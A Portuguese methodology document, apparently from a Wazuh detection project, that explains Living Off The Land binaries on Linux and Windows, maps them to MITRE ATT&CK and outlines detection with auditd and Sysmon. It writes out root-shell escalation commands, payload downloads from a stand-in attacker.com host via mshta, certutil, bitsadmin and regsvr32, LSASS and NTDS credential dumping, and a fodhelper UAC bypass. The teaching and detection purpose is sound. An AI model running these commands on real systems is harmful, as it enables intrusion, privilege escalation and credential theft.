# Metodologia — Como funcionam LOLBins

## O que é Living Off The Land (LotL)?

Atacantes utilizam binários **já presentes no sistema** para executar suas ações, evitando:
- Alertas de antivírus (o binário é legítimo e assinado)
- Detecção por hash (hash do binário é conhecido e "bom")
- Necessidade de baixar ferramentas adicionais

A técnica é amplamente documentada em campanhas de APT, ransomware (Conti, LockBit) e red teams.

---

## Contextos de Abuso no Linux (GTFOBins)

### 1. Shell Escape
Binários que, quando executados em ambientes restritos (rbash, chroot, sudoedit, etc.), permitem obter um shell completo.

```bash
# Exemplo: escape de rbash via vim
vim -c ':!/bin/bash'

# Exemplo: escape via find
find / -name "*.txt" -exec /bin/bash \;
```

### 2. Sudo Abuse
Se um usuário pode executar um binário via `sudo` sem senha (ou com), esse binário pode ser usado para obter shell root.

```bash
# /etc/sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit
```

### 3. SUID Abuse
Binários com o bit SUID definido executam com as permissões do dono (geralmente root).

```bash
# Encontrar binários SUID
find / -perm -4000 -type f 2>/dev/null

# Abusar python com SUID
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 4. Capabilities
Linux capabilities dividem privilégios de root em unidades menores. Algumas capabilities em binários regulares equivalem a root.

```bash
# Encontrar binários com capabilities
getcap -r / 2>/dev/null

# python3 com cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 5. File Read/Write Arbitrário
Binários que leem ou escrevem arquivos arbitrários, úteis para:
- Ler `/etc/shadow`, `/root/.ssh/id_rsa`
- Escrever chaves SSH autorizadas, cron jobs, sudoers

---

## Contextos de Abuso no Windows (LOLBAS)

### 1. Execute (Execução de código)
Binários nativos que executam código arbitrário (DLL, scripts, shellcode).

```cmd
# rundll32 executando DLL remota via COM
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...

# mshta executando HTA remoto
mshta.exe http://attacker.com/payload.hta
```

### 2. Download (Transferência de arquivo)
Binários que fazem requisições HTTP/HTTPS para baixar payloads.

```cmd
# certutil baixando arquivo
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe

# bitsadmin baixando arquivo
bitsadmin /transfer job http://attacker.com/payload.exe C:\payload.exe
```

### 3. AWL Bypass (Application Whitelist Bypass)
Binários que executam código não assinado bypassando AppLocker ou WDAC.

```cmd
# regsvr32 via Squiblydoo
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# installutil (executa código em classe com RunInstaller)
installutil.exe /logfile= /LogToConsole=false payload.exe
```

### 4. Dump (Extração de credenciais/memória)
Binários usados para dumpar LSASS ou Active Directory.

```cmd
# ntdsutil para dump do NTDS.dit
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# task manager / procdump para LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### 5. UAC Bypass
Técnicas que elevam privilégios sem o prompt de UAC.

```cmd
# fodhelper bypass
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
fodhelper.exe
```

---

## Taxonomia MITRE ATT&CK para LOLBins

| Tática | ID | Técnica | Exemplo |
|--------|-----|---------|---------|
| Execution | T1059.001 | PowerShell | `powershell -enc ...` |
| Execution | T1059.003 | Windows Command Shell | `cmd /c ...` |
| Execution | T1059.004 | Unix Shell | `bash -i >& /dev/tcp/...` |
| Execution | T1218.001 | Compiled HTML File | mshta |
| Execution | T1218.010 | Regsvr32 | Squiblydoo |
| Execution | T1218.011 | Rundll32 | DLL remota |
| Execution | T1127.001 | MSBuild | Inline task C# |
| Defense Evasion | T1218 | System Binary Proxy Execution | LOLBins em geral |
| Defense Evasion | T1564.004 | Alternate Data Streams | ADS via certutil |
| Persistence | T1053.003 | Cron Job | cron via file write |
| Privilege Escalation | T1548.001 | SUID/SGID | chmod +s |
| Privilege Escalation | T1548.002 | UAC Bypass | fodhelper |
| Credential Access | T1003.001 | LSASS Memory | procdump |
| Credential Access | T1003.003 | NTDS | ntdsutil |
| Lateral Movement | T1570 | Lateral Tool Transfer | certutil/bitsadmin |
| Collection | T1005 | Data from Local System | find + tar |
| Exfiltration | T1048.003 | Non-C2 Exfil | curl -T / dns |
| C2 | T1071.001 | Web Protocols | curl/wget |

---

## Modelo de Detecção (Pirâmide da Dor)

```
                    /\
                   /  \   TTPs (mais difícil de mudar pelo atacante)
                  / ↑  \  ← Detectar comportamento de LOLBins = aqui
                 /------\
                / Tools  \  Ferramentas (moderado)
               /----------\
              /  Network   \  Indicadores de rede (fácil de mudar)
             /--------------\
            /  Host Artifacts\  Artefatos em disco (fácil de mudar)
           /------------------\
          /   IP Addresses     \  IPs (trivial de mudar)
         /----------------------\
        /        Hash            \  Hashes (trivial de mudar)
       /________________________\
```

**LOLBins são TTPs** — o atacante não pode facilmente "mudar" que usou `curl` ou `certutil` para baixar um payload. Isso torna a detecção baseada em comportamento muito eficaz.

---

## Estratégia de Detecção no Wazuh

### Linux
1. **auditd** monitora syscalls e execuções de processo
2. Regras detectam `execve` com argumentos suspeitos
3. Contexto: uid/gid, parent process, caminho de trabalho

### Windows
1. **Sysmon** (Event ID 1 = Process Create) captura imagem + command line completa
2. Wazuh parseia campos Sysmon e aplica regex nas regras
3. Contexto: parent image, user, network connections (EID 3)

### Redução de Falsos Positivos
- Filtrar por usuário de serviço (CI/CD, backup, monitoramento)
- Correlacionar com horário (fora do expediente = suspeito)
- Correlacionar com parent process (shell vindo de servidor web = crítico)
- Usar listas de exceção por IP de destino (repositórios corporativos)
